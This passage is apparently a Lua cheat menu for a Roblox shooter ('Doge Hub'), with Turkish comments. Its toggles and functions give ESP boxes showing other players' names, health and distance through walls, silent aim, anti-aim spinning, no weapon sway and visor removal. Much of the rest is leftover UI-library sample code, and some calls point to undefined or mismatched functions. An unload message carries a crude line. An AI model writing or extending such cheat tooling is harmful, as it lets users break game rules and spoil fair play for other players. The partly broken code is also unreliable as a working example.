                    -- Sway'i aç (varsayılan değerleri geri yükle)
                    settings.swayMult = 1
                    settings.IdleSwayModifier = 8
                    settings.WalkSwayModifer = 1
                    settings.SprintSwayModifer = 1
                    print(weapon.Name .. " için sway açıldı.")
                end
            end
        end

        -- Toggle durumu tersine çevir
        swayEnabled = not swayEnabled
    else
        warn("Inventory bulunamadı.")
    end
end

LeftGroupBox:AddToggle('nosway', {
    Text = 'No Sway',
    Default = false,
    Callback = function(first)
        toggleSway()
    end
})

LeftGroupBox:AddToggle('skeletonesp', {
    Text = 'Skeleton Esp',
    Default = false,
    Callback = function(first)
        ToggleESP()
    end
})
-- GUI Toggle Integration
LeftGroupBox:AddToggle('Silentim', {
    Text = 'Silent Aim',
    Default = false, -- Default value (true / false)
    Tooltip = 'Working Silent', -- Information shown when you hover over the toggle
    Callback = function(Value)
                silent_aim.enabled = not silent_aim.enabled
        print("Silent Aim " .. (silent_aim.enabled and "Enabled" or "Disabled"))
    end
})

-- Define hitmarker sounds table
-- Define the hitmarker sounds table with all sounds
local HitmarkerSounds = {
    ["TF2"]       = "rbxassetid://8255306220",
    ["Gamesense"] = "rbxassetid://4817809188",
    ["Rust"]      = "rbxassetid://1255040462",
    ["Neverlose"] = "rbxassetid://8726881116",
    ["Bubble"]    = "rbxassetid://198598793",
    ["Quake"]     = "rbxassetid://1455817260",
    ["Among-Us"]  = "rbxassetid://7227567562",
    ["Ding"]      = "rbxassetid://2868331684",
    ["Minecraft"] = "rbxassetid://6361963422",
    ["Blackout"]  = "rbxassetid://3748776946",
    ["Osu!"]      = "rbxassetid://7151989073",
}

-- Create the dropdown for selecting hit sounds
LeftGroupBox:AddDropdown('cameradropdown', {
    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  -- Add all the options
    Default = 3,  -- Default selection is 'Rust'
    Multi = false,
    Text = 'Hit Sounds', 
    Tooltip = 'Hit Sounds', 
    Callback = function(state)
        -- Get the selected sound ID from the HitmarkerSounds table
        local globalhitsounds = HitmarkerSounds[state]
        
        -- Ensure the sound ID is valid and exists
        if globalhitsounds then
            local SFXDIRECTORY = game.ReplicatedStorage.SFX

            -- Assign the selected sound ID to all relevant sounds
            SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Helmet.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.SoundId = globalhitsounds
            SFXDIRECTORY.Hits.HitMarkers.Headshot.SoundId = globalhitsounds
            ---------------------------------------------------------------
            SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.Volume = 3
            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.Volume = 4
            SFXDIRECTORY.Hits.HitMarkers.Helmet.Volume = 4
            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.Volume = 4.5
            SFXDIRECTORY.Hits.HitMarkers.Headshot.Volume = 4
        else
            warn("Selected hit sound is not available!")
        end
    end
})



-- Services
-- Services
local workspace = game:GetService("Workspace")


-- ESP toggle
local espEnabled = false
local espObjects = {}

-- Custom distance factor for game (set according to game specifics)
local customFactor = 0.23 -- Modify this according to your game's specific scale

-- Function to create a 2D box
local function create2DBox()
    local box = {}
    box.topLeft = Drawing.new("Line")
    box.topRight = Drawing.new("Line")
    box.bottomLeft = Drawing.new("Line")
    box.bottomRight = Drawing.new("Line")
    
    -- Set properties for the lines (white, 1-pixel width)
    for _, line in pairs(box) do
        line.Color = Color3.new(1, 1, 1) -- White color
        line.Thickness = 1
        line.Transparency = 1
    end
    
    return box
end

-- Function to update 2D box positions
local function update2DBox(box, character)
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end
    
    -- Get the 3D corners of the character's bounding box
    local corners = {
        rootPart.Position + Vector3.new(-2, 3, -1),  -- Top left corner
        rootPart.Position + Vector3.new(2, 3, -1),   -- Top right corner
        rootPart.Position + Vector3.new(-2, -3, -1), -- Bottom left corner
        rootPart.Position + Vector3.new(2, -3, -1)   -- Bottom right corner
    }
    
    -- Project 3D world positions to 2D screen positions
    local screenCorners = {}
    for i, corner in ipairs(corners) do
        local screenPos, onScreen = camera:WorldToViewportPoint(corner)
        if onScreen then
            screenCorners[i] = Vector2.new(screenPos.X, screenPos.Y)
        else
            -- Hide the box if any part of it goes off-screen
            for _, line in pairs(box) do
                line.Visible = false
            end
            return
        end
    end
    
    -- Set positions for the box lines
    box.topLeft.From = screenCorners[1]
    box.topLeft.To = screenCorners[2]
    
    box.bottomLeft.From = screenCorners[3]
    box.bottomLeft.To = screenCorners[4]
    
    box.topRight.From = screenCorners[1]
    box.topRight.To = screenCorners[3]
    
    box.bottomRight.From = screenCorners[2]
    box.bottomRight.To = screenCorners[4]
    
    -- Make sure the box is visible
    for _, line in pairs(box) do
        line.Visible = true
    end
end

-- Function to remove 2D box
local function remove2DBox(box)
    for _, line in pairs(box) do
        line:Remove()
    end
end

-- Function to create or update ESP for a player
local function createOrUpdateESP(player)
    local character = player.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return end

    -- Create ESP if it doesn't already exist for this player
    if not espObjects[player] then
        local boxESP = create2DBox()

        -- Billboard for Name and Health
        local billboard = Instance.new("BillboardGui")
        billboard.Adornee = character.HumanoidRootPart
        billboard.Size = UDim2.new(0, 200, 0, 50)
        billboard.StudsOffset = Vector3.new(0, 3, 0)
        billboard.AlwaysOnTop = true
        billboard.Parent = character.HumanoidRootPart

        local nameHealthLabel = Instance.new("TextLabel", billboard)
        nameHealthLabel.BackgroundTransparency = 1
        nameHealthLabel.Size = UDim2.new(0, 200, 0, 11)
        nameHealthLabel.Font = Enum.Font.Code
        nameHealthLabel.TextSize = 11
        nameHealthLabel.TextColor3 = Color3.new(1, 1, 1)
        nameHealthLabel.TextStrokeTransparency = 0.8

        -- Health bar
        local healthBar = Instance.new("Frame", billboard)
        healthBar.BackgroundColor3 = Color3.new(0.121569, 0.945098, 0.011765) -- Green color
        healthBar.Size = UDim2.new(0, 20, 0, 50)
        healthBar.Position = UDim2.new(0, 210, 0, 0)
        healthBar.BorderSizePixel = 0
        healthBar.BackgroundTransparency = 0.5

        -- Billboard for Distance
        local distanceBillboard = Instance.new("BillboardGui")
        distanceBillboard.Adornee = character.HumanoidRootPart
        distanceBillboard.Size = UDim2.new(0, 200, 0, 11)
        distanceBillboard.StudsOffset = Vector3.new(0, -2, 0)
        distanceBillboard.AlwaysOnTop = true
        distanceBillboard.Parent = character.HumanoidRootPart

        local distanceLabel = Instance.new("TextLabel", distanceBillboard)
        distanceLabel.BackgroundTransparency = 1
        distanceLabel.Size = UDim2.new(0, 200, 0, 11)
        distanceLabel.Font = Enum.Font.Code
        distanceLabel.TextSize = 11
        distanceLabel.TextColor3 = Color3.new(1, 1, 1)
        distanceLabel.TextStrokeTransparency = 0.8

        -- Store ESP elements for later use
        espObjects[player] = {
            boxESP = boxESP,
            nameHealthLabel = nameHealthLabel,
            healthBar = healthBar,
            distanceLabel = distanceLabel
        }
    end

    -- Update ESP elements for the player
    local humanoid = character:FindFirstChild("Humanoid")
    if humanoid then
        local health = humanoid.Health
        local maxHealth = humanoid.MaxHealth
        espObjects[player].nameHealthLabel.Text = string.format("%s | %d/%d", player.Name, health, maxHealth)

        -- Update health bar
        local healthBar = espObjects[player].healthBar
        healthBar.Size = UDim2.new(0, 20, 0, 50 * (health / maxHealth))

        -- Calculate distance in meters (1 stud = 0.28 meters)
        local distance = (character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).Magnitude * customFactor
        espObjects[player].distanceLabel.Text = string.format("%.2f m", distance)

        -- Update the 2D box
        update2DBox(espObjects[player].boxESP, character)
    end
end

-- Function to remove ESP for a player
local function removeESP(player)
    if espObjects[player] then
        -- Clean up the ESP objects
        remove2DBox(espObjects[player].boxESP)
        espObjects[player].nameHealthLabel:Destroy()
        espObjects[player].healthBar:Destroy()
        espObjects[player].distanceLabel:Destroy()
        espObjects[player] = nil
    end
end

-- Function to check for nearby players every 0.1 seconds
local function checkNearbyPlayers()
    while espEnabled do
        local localCharacter = localPlayer.Character
        if localCharacter and localCharacter:FindFirstChild("HumanoidRootPart") then
            for _, player in pairs(players:GetPlayers()) do
                if player ~= localPlayer then
                    local character = player.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local distance = (character.HumanoidRootPart.Position - localCharacter.HumanoidRootPart.Position).Magnitude * customFactor
                        if distance <= 1000 / customFactor then -- 1000 meterye kadar olan mesafeleri göster
                            createOrUpdateESP(player)
                        else
                            removeESP(player)
                        end
                    else
                        removeESP(player)
                    end
                end
            end
        end
        wait(0.1) -- Update every 0.1 seconds
    end
end

-- Function to toggle ESP
local function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        coroutine.wrap(checkNearbyPlayers)()
    else
        -- Clean up all ESP objects when disabling
        for _, player in pairs(players:GetPlayers()) do
            removeESP(player)
        end
    end
end

-- Add ESP for players when they join
players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        if espEnabled then
            createOrUpdateESP(player)
        end
    end)
    player.CharacterRemoving:Connect(function()
        removeESP(player)
    end)
end)

-- Example of how to toggle ESP
LeftGroupBox:AddToggle('EspSwitch', {
    Text = 'Enable ESP',
    Default = false,
    Callback = function(first)
        toggleESP()
    end
})




local character = player.Character or player.CharacterAdded:Wait()

local antiAimActive = false -- Toggle durumu
local spinspeed = 0.1 -- Varsayılan döngü süresi

-- Anti Aim Fonksiyonu
local function AntiAim()
    while true do
        wait(spinspeed) -- Döngü için bekleme süresi 
        if antiAimActive and character and character:FindFirstChild("HumanoidRootPart") then
            -- Karakterin yönünü rastgele değiştirme
            character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.random(-1, 1) * math.pi/2, 0)
        end
    end
end

-- Toggle Fonksiyonu
local function ToggleAntiAim()
    antiAimActive = not antiAimActive
    if antiAimActive then
        print("Anti Aim Aktif")
    else
        print("Anti Aim Pasif")
    end
end

-- Klavye dinleyicisi
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.T and not gameProcessed then -- 'T' tuşuna basınca toggle
        ToggleAntiAim()
    end
end)

-- ESP ayarları
antiaimtab:AddToggle('Spin', {
    Text = 'Spin',
    Default = false,
    Callback = function(enabled)
        antiAimActive = enabled
        if enabled then
            print("Anti Aim Aktif")
            spawn(AntiAim) -- Anti Aim fonksiyonunu ayrı bir iş parçacığında çalıştır
        else
            print("Anti Aim Pasif")
        end
    end
})

-- Spin speed ayarı
antiaimtab:AddSlider('spinspeed', {
    Text = 'Spin Speed',
    Default = 0.1,
    Min = 0.01,
    Max = 1,
    Rounding = 3,
    Compact = false,
    Callback = function(Value)
        spinspeed = Value
    end
})
antiaimtab:AddLabel('Fastest One Is 0.01', true)
-- Anti Aim'i Başlat



-- Function to check and display weapon names
local function checkAndDisplayWeaponNames()
    local rangedWeapons = replicatedStorage:FindFirstChild("RangedWeapons")
    if not rangedWeapons then return end

    local playerFolder = workspace:FindFirstChild(localPlayer.Name)
    if not playerFolder then return end

    -- Iterate through all the weapons in RangedWeapons
    for _, weapon in pairs(rangedWeapons:GetChildren()) do
        local weaponName = weapon.Name
        
        -- Check if there's an object with the same name in the player's folder
        local playerWeapon = playerFolder:FindFirstChild(weaponName)
        if playerWeapon then
            -- Add a text label to display the weapon name
            local billboard = Instance.new("BillboardGui")
            billboard.Adornee = playerWeapon
            billboard.Size = UDim2.new(0, 200, 0, 50)
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = playerWeapon
            
            local weaponNameLabel = Instance.new("TextLabel", billboard)
            weaponNameLabel.BackgroundTransparency = 1
            weaponNameLabel.Size = UDim2.new(1, 0, 1, 0)
            weaponNameLabel.Text = weaponName
            weaponNameLabel.Font = Enum.Font.Code
            weaponNameLabel.TextSize = 14
            weaponNameLabel.TextColor3 = Color3.new(1, 1, 1)
            weaponNameLabel.TextStrokeTransparency = 0.8
        end
    end
end

-- Call the function to check and display weapon names
checkAndDisplayWeaponNames()











LeftGroupBox:AddToggle('removevisors', {
    Text = 'Remove Visors',
    Default = false,
    Callback = function(state)  -- Renamed 'first' to 'state' for clarity
        if state then
            game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visible = false
        else
            game.Players.LocalPlayer.PlayerGui.MainGui.MainFrame.ScreenEffects.Visible = true
        end
    end
})







LeftGroupBox:AddToggle('fovdisplay', {
    Text = 'Show FOV Circle',
    Tooltip = 'Toggle the visibility of the FOV circle',
    Default = true,
    Callback = function(visible)
        -- Update FOV circle visibility
        if fovCircle then
            fovCircle.Visible = visible
        end
    end
})

LeftGroupBox:AddToggle('debugPrint', {
    Text = 'Debug Print',
    Tooltip = 'Toggle debug print statements',
    Default = false,
    Callback = function(enabled)
        debugEnabled = enabled
        print("Debug Print " .. (debugEnabled and "Enabled" or "Disabled"))
    end
})

-- Create the FOV Circle initially



local MyButton = LeftGroupBox:AddButton({
    Text = 'Button',
    Func = function()
        print('You clicked a button!')
    end,
    DoubleClick = false,
    Tooltip = 'This is the main button'
})

local MyButton2 = MyButton:AddButton({
    Text = 'Sub button',
    Func = function()
        print('You clicked a sub button!')
    end,
    DoubleClick = true, -- You will have to click this button twice to trigger the callback
    Tooltip = 'This is the sub button (double click me!)'
})

--[[
    NOTE: You can chain the button methods!
    EXAMPLE:

    LeftGroupBox:AddButton({ Text = 'Kill all', Func = Functions.KillAll, Tooltip = 'This will kill everyone in the game!' })
        :AddButton({ Text = 'Kick all', Func = Functions.KickAll, Tooltip = 'This will kick everyone in the game!' })
]]

-- Groupbox:AddLabel
-- Arguments: Text, DoesWrap
LeftGroupBox:AddLabel('This is a label')
LeftGroupBox:AddLabel('This is a label\n\nwhich wraps its text!', true)

-- Groupbox:AddDivider
-- Arguments: None
LeftGroupBox:AddDivider()

--[[
    Groupbox:AddSlider
    Arguments: Idx, SliderOptions

    SliderOptions: {
        Text = string,
        Default = number,
        Min = number,
        Max = number,
        Suffix = string,
        Rounding = number,
        Compact = boolean,
        HideMax = boolean,
    }

    Text, Default, Min, Max, Rounding must be specified.
    Suffix is optional.
    Rounding is the number of decimal places for precision.

    Compact will hide the title label of the Slider

    HideMax will only display the value instead of the value & max value of the slider
    Compact will do the same thing
]]
LeftGroupBox:AddSlider('MySlider', {
    Text = 'This is my slider!',
    Default = 0,
    Min = 0,
    Max = 5,
    Rounding = 1,
    Compact = false,

    Callback = function(Value)
        
    end
})

-- Options is a table added to getgenv() by the library
-- You index Options with the specified index, in this case it is 'MySlider'
-- To get the value of the slider you do slider.Value



-- Groupbox:AddInput
-- Arguments: Idx, Info
LeftGroupBox:AddInput('MyTextbox', {
    Default = 'My textbox!',
    Numeric = false, -- true / false, only allows numbers
    Finished = false, -- true / false, only calls callback when you press enter

    Text = 'This is a textbox',
    Tooltip = 'This is a tooltip', -- Information shown when you hover over the textbox

    Placeholder = 'Placeholder text', -- placeholder text when the box is empty
    -- MaxLength is also an option which is the max length of the text

    Callback = function(Value)
        print('[cb] Text updated. New text:', Value)
    end
})

Options.MyTextbox:OnChanged(function()
    print('Text updated. New text:', Options.MyTextbox.Value)
end)

-- Groupbox:AddDropdown
-- Arguments: Idx, Info

LeftGroupBox:AddDropdown('MyDropdown', {
    Values = { 'This', 'is', 'a', 'dropdown' },
    Default = 1, -- number index of the value / string
    Multi = false, -- true / false, allows multiple choices to be selected

    Text = 'A dropdown',
    Tooltip = 'This is a tooltip', -- Information shown when you hover over the dropdown

    Callback = function(Value)
        print('[cb] Dropdown got changed. New value:', Value)
    end
})

Options.MyDropdown:OnChanged(function()
    print('Dropdown got changed. New value:', Options.MyDropdown.Value)
end)

Options.MyDropdown:SetValue('This')

-- Multi dropdowns
LeftGroupBox:AddDropdown('MyMultiDropdown', {
    -- Default is the numeric index (e.g. "This" would be 1 since it if first in the values list)
    -- Default also accepts a string as well

    -- Currently you can not set multiple values with a dropdown

    Values = { 'This', 'is', 'a', 'dropdown' },
    Default = 1,
    Multi = true, -- true / false, allows multiple choices to be selected

    Text = 'A dropdown',
    Tooltip = 'This is a tooltip', -- Information shown when you hover over the dropdown

    Callback = function(Value)
        print('[cb] Multi dropdown got changed:', Value)
    end
})

Options.MyMultiDropdown:OnChanged(function()
    -- print('Dropdown got changed. New value:', )
    print('Multi dropdown got changed:')
    for key, value in next, Options.MyMultiDropdown.Value do
        print(key, value) -- should print something like This, true
    end
end)

Options.MyMultiDropdown:SetValue({
    This = true,
    is = true,
})

LeftGroupBox:AddDropdown('MyPlayerDropdown', {
    SpecialType = 'Player',
    Text = 'A player dropdown',
    Tooltip = 'This is a tooltip', -- Information shown when you hover over the dropdown

    Callback = function(Value)
        print('[cb] Player dropdown got changed:', Value)
    end
})

-- Label:AddColorPicker
-- Arguments: Idx, Info

-- You can also ColorPicker & KeyPicker to a Toggle as well

LeftGroupBox:AddLabel('Color'):AddColorPicker('ColorPicker', {
    Default = Color3.new(0, 1, 0), -- Bright green
    Title = 'Some color', -- Optional. Allows you to have a custom color picker title (when you open it)
    Transparency = 0, -- Optional. Enables transparency changing for this color picker (leave as nil to disable)

    Callback = function(Value)
        
    end
})



-- Label:AddKeyPicker
-- Arguments: Idx, Info

 -- Sets keybind to MB2, mode to Hold

-- Long text label to demonstrate UI scrolling behaviour.
local LeftGroupBox2 = Tabs.Main:AddLeftGroupbox('Groupbox #2');
LeftGroupBox2:AddLabel('Oh no...\nThis label spans multiple lines!\n\nWe\'re gonna run out of UI space...\nJust kidding! Scroll down!\n\n\nHello from below!', true)

local TabBox = Tabs.Main:AddRightTabbox() -- Add Tabbox on right side

-- Anything we can do in a Groupbox, we can do in a Tabbox tab (AddToggle, AddSlider, AddLabel, etc etc...)
local Tab1 = TabBox:AddTab('Tab 1')
Tab1:AddToggle('Tab1Toggle', { Text = 'Tab1 Toggle' });

local Tab2 = TabBox:AddTab('Tab 2')
Tab2:AddToggle('Tab2Toggle', { Text = 'Tab2 Toggle' });

-- Dependency boxes let us control the visibility of UI elements depending on another UI elements state.
-- e.g. we have a 'Feature Enabled' toggle, and we only want to show that features sliders, dropdowns etc when it's enabled!
-- Dependency box example:
local RightGroupbox = Tabs.Main:AddRightGroupbox('Groupbox #3');
RightGroupbox:AddToggle('ControlToggle', { Text = 'Dependency box toggle' });

local Depbox = RightGroupbox:AddDependencyBox();
Depbox:AddToggle('DepboxToggle', { Text = 'Sub-dependency box toggle' });

-- We can also nest dependency boxes!
-- When we do this, our SupDepbox automatically relies on the visiblity of the Depbox - on top of whatever additional dependencies we set
local SubDepbox = Depbox:AddDependencyBox();
SubDepbox:AddSlider('DepboxSlider', { Text = 'Slider', Default = 50, Min = 0, Max = 100, Rounding = 0 });
SubDepbox:AddDropdown('DepboxDropdown', { Text = 'Dropdown', Default = 1, Values = {'a', 'b', 'c'} });

Depbox:SetupDependencies({
    { Toggles.ControlToggle, true } -- We can also pass `false` if we only want our features to show when the toggle is off!
});

SubDepbox:SetupDependencies({
    { Toggles.DepboxToggle, true }
});

-- Library functions
-- Sets the watermark visibility
Library:SetWatermarkVisibility(true)

-- Example of dynamically-updating watermark with common traits (fps and ping)
local FrameTimer = tick()
local FrameCounter = 0;
local FPS = 60;

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

Library:SetWatermark(('Doge Hub /\ Wave | %s fps | %s ms | %s | %s'):format(
    math.floor(FPS),
    math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()),
    os.date("%H:%M:%S"),  -- Current time
    os.date("%Y-%m-%d")   -- Current date in YYYY-MM-DD format
));
end);


Library.KeybindFrame.Visible = true; -- todo: add a function for this

Library:OnUnload(function()
    WatermarkConnection:Disconnect()

    print('Unloaded!')
    warn("did you fingered your ass today?")
    Library.Unloaded = true
end)

-- UI Settings
local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

-- I set NoUI so it does not show up in the keybinds menu
MenuGroup:AddButton('Unload', function() Library:Unload() end)
--MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'RightShift', NoUI = true, Text = 'Menu keybind' })

Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu

-- Addons:
-- SaveManager (Allows you to have a configuration system)
-- ThemeManager (Allows you to have a menu theme system)

-- Hand the library over to our managers
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- Adds our MenuKeybind to the ignore list
-- (do you want each config to have a different menu key? probably not.)
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
ThemeManager:SetFolder('dogehubwave')
SaveManager:SetFolder('dogehub/wavepd')

-- Builds our config menu on the right side of our tab
SaveManager:BuildConfigSection(Tabs['UI Settings'])

-- Builds our theme menu (with plenty of built in themes) on the left side
-- NOTE: you can also call ThemeManager:ApplyToGroupbox to add it to a specific groupbox
ThemeManager:ApplyToTab(Tabs['UI Settings'])

-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()
trackPlayers()


-- Create a ScreenGui to hold the blur effect

-- Define the necessary services




-- Optional: Initial application of the blur
-- toggleBlur()  -- Uncomment if you want to start with blur applied

return
